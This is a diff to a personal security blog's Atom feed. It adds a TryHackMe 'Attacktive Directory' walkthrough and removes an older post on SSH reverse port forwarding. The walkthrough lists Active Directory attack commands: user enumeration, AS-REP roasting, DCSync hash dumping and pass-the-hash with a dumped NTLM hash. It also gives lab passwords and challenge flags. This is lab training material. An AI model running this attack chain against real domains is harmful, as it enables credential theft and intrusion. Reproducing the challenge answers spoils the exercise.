@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://jlkl.github.io/"/>
-  <updated>2021-12-18T13:51:29.705Z</updated>
+  <updated>2022-03-02T12:25:35.016Z</updated>
   <id>https://jlkl.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>TryHackMe Attacktive Directory Walkthrough</title>
+    <link href="https://jlkl.github.io/2022/03/02/Web-21/"/>
+    <id>https://jlkl.github.io/2022/03/02/Web-21/</id>
+    <published>2022-03-02T12:20:39.000Z</published>
+    <updated>2022-03-02T12:25:35.016Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Task-3-Welcome-to-Attacktive-Directory"><a href="#Task-3-Welcome-to-Attacktive-Directory" class="headerlink" title="Task 3 Welcome to Attacktive Directory"></a>Task 3 Welcome to Attacktive Directory</h2><p>nmap扫描端口</p><p><img src="/2022/03/02/Web-21/iGpDs-dZvkOU1N62csbP7pmjkjrrrWH6U4UVO4dfIuw.png" alt="image"></p><p>enum4linux获取139/445信息，这个工具有探查端口信息，枚举用户名的功能</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -A 10.10.28.202</span><br></pre></td></tr></table></figure><a id="more"></a><p><img src="/2022/03/02/Web-21/s9LbXGXZDZRVg3yBF6xOOOJbfFqxalJWro1W02n721c.png" alt="image"></p><p>What tool will allow us to enumerate port 139/445?</p><p>enum4linux</p><p>What is the NetBIOS-Domain Name of the machine?</p><p>THM-AD</p><p>What invalid TLD do people commonly use for their Active Directory Domain?</p><p>.local</p><h2 id="Task-4-Enumerating-Users-via-Kerberos"><a href="#Task-4-Enumerating-Users-via-Kerberos" class="headerlink" title="Task 4 Enumerating Users via Kerberos"></a>Task 4 Enumerating Users via Kerberos</h2><p>kerbrute枚举用户</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute userenum -d spookysec.local --dc 10.10.210.2 userlist.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/03/02/Web-21/QWa8hH7ZQHL_8YD81M1Tg2nTTqPhhi6N7VkrN1jBqBA.png" alt="image"></p><p>What command within Kerbrute will allow us to enumerate valid usernames?</p><p>userenum</p><p>What notable account is discovered? (These should jump out at you)</p><p> svc-admin</p><p>What is the other notable account is discovered? (These should jump out at you)</p><p>backup</p><h2 id="Task-5-Abusing-Kerberos"><a href="#Task-5-Abusing-Kerberos" class="headerlink" title="Task 5 Abusing Kerberos"></a>Task 5 Abusing Kerberos</h2><p>AS-PEP Roasting攻击，对于设置了选项”Do not require Kerberos preauthentication”的用户，可以离线爆破获取用户的hash</p><p>先添加dns记录</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 10.10.194.183 spookysec.local &gt;&gt; &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure><p>获取svc-admin TGT</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py spookysec.local&#x2F;svc-admin -no-pass</span><br></pre></td></tr></table></figure><p><img src="/2022/03/02/Web-21/nHg50n_cajoWK1CzkrFWL_30mK6GL5cos9DjEZsvIPg.png" alt="image"></p><p>hashcat爆破hash，这里m1芯片有点问题</p><p>We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?</p><p> svc-admin</p><p>Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)</p><p> Kerberos 5, etype 23, AS-REP</p><p>What mode is the hash?</p><p>18200</p><p>Now crack the hash with the modified password list provided, what is the user accounts password?</p><p>management2005</p><h2 id="Task-6-Back-to-the-Basics"><a href="#Task-6-Back-to-the-Basics" class="headerlink" title="Task 6 Back to the Basics"></a>Task 6 Back to the Basics</h2><p><img src="/2022/03/02/Web-21/isncjU0iHkYPGagaSzZaRl3vn7OvZNcEFm2sTu_9dns.png" alt="image"></p><p>连接smb服务，获取文件，base64解密</p><p>What utility can we use to map remote SMB shares?</p><p> smbclient</p><p>Which option will list shares?</p><p>-l</p><p>How many remote shares is the server listing?</p><p>6</p><p>There is one particular share that we have access to that contains a text file. Which share is it?</p><p> backup</p><p>What is the content of the file?</p><p> YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw</p><p>Decoding the contents of the file, what is the full contents?</p><p><a href="mailto:backup@spookysec.local">backup@spookysec.local</a>:backup2517860</p><h2 id="Task-7-Elevating-Privileges-within-the-Domain"><a href="#Task-7-Elevating-Privileges-within-the-Domain" class="headerlink" title="Task 7 Elevating Privileges within the Domain"></a>Task 7 Elevating Privileges within the Domain</h2><p>backup账户有DCSync权限，直接dumphash</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -just-dc backup@spookysec.local</span><br></pre></td></tr></table></figure><p><img src="/2022/03/02/Web-21/CwDtGxSyzu8e25E0NUcMA1CyrERjOpsNw1LHSun2ZMI.png" alt="image"></p><p>What method allowed us to dump NTDS.DIT?</p><p>DRSUAPI</p><p>What is the Administrators NTLM hash?</p><p> 0e0363213e37b94221497260b0bcb4fc</p><p>What method of attack could allow us to authenticate as the user without the password?</p><p>Pass the Hash</p><p>Using a tool called Evil-WinRM what option will allow us to use a hash?</p><p>-H</p><h2 id="Task-8-Flag-Submission-Panel"><a href="#Task-8-Flag-Submission-Panel" class="headerlink" title="Task 8 Flag Submission Panel"></a>Task 8 Flag Submission Panel</h2><p>pth执行命令</p><p><img src="/2022/03/02/Web-21/dgVpKj6b0iKS0wUSWvH-csdoXxTUn_9MH2ue9sc9UZs.png" alt="image"></p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc Administrator@spookysec.local</span><br></pre></td></tr></table></figure><p><img src="/2022/03/02/Web-21/6QS1poHn26bAYD52_hv9YSSAZyEq6amW0Zu66iqgZKc.png" alt="image"></p><p>svc-admin</p><p>TryHackMe{K3rb3r0s_Pr3_4uth}</p><p>backup</p><p>TryHackMe{B4ckM3UpSc0tty}</p><p>Administrator</p><p>TryHackMe{4ctiveD1rectoryM4st3r}</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Task-3-Welcome-to-Attacktive-Directory&quot;&gt;&lt;a href=&quot;#Task-3-Welcome-to-Attacktive-Directory&quot; class=&quot;headerlink&quot; title=&quot;Task 3 Welcome to Attacktive Directory&quot;&gt;&lt;/a&gt;Task 3 Welcome to Attacktive Directory&lt;/h2&gt;&lt;p&gt;nmap扫描端口&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/2022/03/02/Web-21/iGpDs-dZvkOU1N62csbP7pmjkjrrrWH6U4UVO4dfIuw.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;p&gt;enum4linux获取139/445信息，这个工具有探查端口信息，枚举用户名的功能&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;figcaption&gt;&lt;span&gt;Text&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;enum4linux -A 10.10.28.202&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
+    
+      <category term="Pentest" scheme="https://jlkl.github.io/tags/Pentest/"/>
+    
+  </entry>
   
   <entry>
     <title>Fastjson parse突破特殊getter调用限制</title>
@@ -551,29 +577,6 @@
     </summary>
     
     
-    
-  </entry>
-  
-  <entry>
-    <title>ssh端口转发内网到公网</title>
-    <link href="https://jlkl.github.io/2019/04/17/Web_14/"/>
-    <id>https://jlkl.github.io/2019/04/17/Web_14/</id>
-    <published>2019-04-17T15:03:50.000Z</published>
-    <updated>2019-05-07T08:49:20.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>起因是想要在家里或者使用流量能够访问校园网抢课以及其他操作，路由器刷的华硕固件，正好有搭建 ss 服务器的功能。</p><p>百度一下大概的实现方式，大多都是采用 ngrok 或者花生壳内网穿透的方式，实际测试了一下，ngrok 免费的服务很难连接上且不稳定。花生壳直接是付费服务。自己搭建 ngrok 又需要一个域名。</p><p>结合专业知识，只需要将 ss 服务的端口转发到公网上就可以了，所以最终采用了 ssh端口转发+ss-server 的方式，不得不推一下，ssh端口转发真的很方便快捷 :P</p><a id="more"></a><h2 id="ssh端口转发"><a href="#ssh端口转发" class="headerlink" title="ssh端口转发"></a>ssh端口转发</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -NfR port_on_your_vps:<span class="number">192.168</span><span class="number">.123</span><span class="number">.1</span>:<span class="number">80</span> <span class="symbol">username@</span>*.*.*.*</span><br><span class="line"></span><br><span class="line">-R 远程转发</span><br><span class="line">-N ssh连接之后不执行命令</span><br><span class="line">-f 验证密码之后再后台运行</span><br></pre></td></tr></table></figure><p>这个有个坑点，在默认没有进行设置的情况下直接转发，在 vps 上反向代理的 lookup 的 ip 即 127.0.0.1，并不是公网 ip，在姜哥的指点下了解了这个点。</p><p>解决方法：<br>首先 ssh 登录到公网主机，修改 sshd 的配置文件 <code>/etc/ssh/sshd_config</code>，加入如下选项</p><p><code>GatewayPorts yes</code></p><p>然后重启 ssh 服务，<code>service sshd restart</code></p><p>可以参照：<a href="http://www.netcan666.com/2016/09/28/ssh%E9%9A%A7%E9%81%93%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E5%88%B0%E5%85%AC%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" target="_blank" rel="noopener">http://www.netcan666.com/2016/09/28/ssh%E9%9A%A7%E9%81%93%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E5%88%B0%E5%85%AC%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</a></p><p>每次登陆都需要设置密码太麻烦，设置免密登录</p><p>华硕固件中 ssh 服务采用的 Dropbear，没有 ssh-keygen，可用 dropbearkey 替代</p><p><code>dropbearkey -t rsa -f .ssh/id_dropbear_rsa | grep &quot;ssh-rsa&quot; &gt; .ssh/id_dropbear_rsa.pub</code></p><p>生成公私匙，将公匙 id_dropbear_rsa.pub 上传到 vps，具体可以参照</p><p><a href="https://my.oschina.net/u/2306127/blog/3027225" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/3027225</a></p><p>最后写了个脚本，然后设置了定时执行，舒服了。<code>-i</code> 参数指定的是 ssh 的私匙，这个要注意</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#copyright by Str3am</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#kill掉全部ssh命令</span></span><br><span class="line">logger -t <span class="string">"ssh端口转发"</span> <span class="string">"结束ssh进程"</span></span><br><span class="line">killall ssh</span><br><span class="line"></span><br><span class="line"><span class="comment">#转发后台</span></span><br><span class="line">ssh -yNfR port_on_your_vps:192.168.123.1:80 username@*.*.*.* -i /etc/storage/.ssh/id_dropbear_rsa -K 1</span><br><span class="line"></span><br><span class="line"><span class="comment">#转发ss服务器端口</span></span><br><span class="line">ssh -yNfR port_on_your_vps:192.168.123.1:2333 username@*.*.*.* -i /etc/storage/.ssh/id_dropbear_rsa -K 1</span><br><span class="line">logger -t <span class="string">"ssh端口转发"</span> <span class="string">"成功转发端口"</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="http://lypto.me/2018/12/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" target="_blank" rel="noopener">端口转发方式总结</a></li><li><a href="http://einverne.github.io/post/2017/05/ssh-keep-alive.html" target="_blank" rel="noopener">保持ssh登录</a></li></ul>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;起因是想要在家里或者使用流量能够访问校园网抢课以及其他操作，路由器刷的华硕固件，正好有搭建 ss 服务器的功能。&lt;/p&gt;
-&lt;p&gt;百度一下大概的实现方式，大多都是采用 ngrok 或者花生壳内网穿透的方式，实际测试了一下，ngrok 免费的服务很难连接上且不稳定。花生壳直接是付费服务。自己搭建 ngrok 又需要一个域名。&lt;/p&gt;
-&lt;p&gt;结合专业知识，只需要将 ss 服务的端口转发到公网上就可以了，所以最终采用了 ssh端口转发+ss-server 的方式，不得不推一下，ssh端口转发真的很方便快捷 :P&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
     
   </entry>
   
